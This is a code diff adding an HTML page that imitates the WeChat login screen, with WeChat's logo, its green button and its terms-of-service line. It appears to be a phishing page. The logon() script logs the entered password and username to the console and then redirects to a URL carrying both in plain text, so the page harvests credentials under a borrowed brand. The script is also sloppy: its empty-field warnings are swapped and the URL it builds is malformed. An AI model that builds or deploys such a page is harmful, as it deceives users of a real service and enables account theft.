@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title>微信登录</title>
+        <meta charset="utf-8" />
+        <script>
+            function logon(){
+    var password=document.getElementById("password").value;
+    var usersname=document.getElementById("usersname").value;
+    if
+    (
+        password == ""
+    )
+    {
+        alert("微信号不可为空")
+        console.log("Error!")
+        console.log("pwd:"+password)
+        console.log("users:"+usersname)
+        return false
+    }
+    if(usersname == ""){
+        alert("密码不可为空")
+        console.log("Error!")
+        console.log("pwd:"+password)
+        console.log("users:"+usersname)
+        return false
+    }
+    else
+    {
+        console.log("Right")
+        console.log("password:"+password)
+        console.log("usersname:"+usersname)
+        var url="'"+"usersname="+usersname+"password="+password
+        window.location.href=url
+    }
+}
+        </script>
+        <style>
+            .logo{
+                background-image: url(https://img2.baidu.com/it/u=2514647532,2424611044&fm=253&fmt=auto&app=138&f=JPEG?w=587&h=500);
+                background-size: 100%;
+                background-repeat: no-repeat;
+                width:30%;
+                height: 350px;
+            }
+            .input{
+                width: 70%;
+                height: 100px;
+                text-align: center;
+                font-size: 50px;
+                border-radius: 20px;
+            }
+        </style>
+    </head>
+    <body>
+        <div align="center">
+            <div style="width: 100%;height:100px;"></div>
+        </div>
+        <div align="center">
+            <div class="logo"></div>
+        </div>
+        <div align="center">
+            <div style="width: 100%;height:70px;"></div>
+            <input class="input" id="usersname" placeholder="微信号/手机号/邮箱" />
+            <div style="width: 100%;height:50px;"></div>
+            <input placeholder="密码" class="input" id="password" type="password" />
+        </div>
+        <div align="center">
+            <div style="width: 100%;height:150px;"></div>
+            <div align="center">
+                <button class="btn" onclick="logon()">
+                    <span>登录</span>
+                </button>
+            </div>
+        </div>
+        <style>
+            .btn{
+                width: 70%;
+                height: 100px;
+                color: white;
+                background-color: rgb(0, 153, 0);
+                font-size: 50px;
+                border: none;
+                border-radius: 20px;
+            }
+            .checkbox{
+                width: 30px;
+                height: 30px;;
+            }
+        </style>
+        <div align="center">
+            <div style="width: 70%;">
+                <table>
+                    <td>
+                        <input type="checkbox" checked class="checkbox" />
+                    </td>
+                    <td>
+                        <p style="font-size: 30px;">登录即代表同意</p>
+                    </td>
+                    <td>
+                        <p style="font-size: 30px;color: cornflowerblue;">微信服务条款</p>
+                    </td>
+                </table>
+            </div>
+        </div>
+    </body>
+</html>
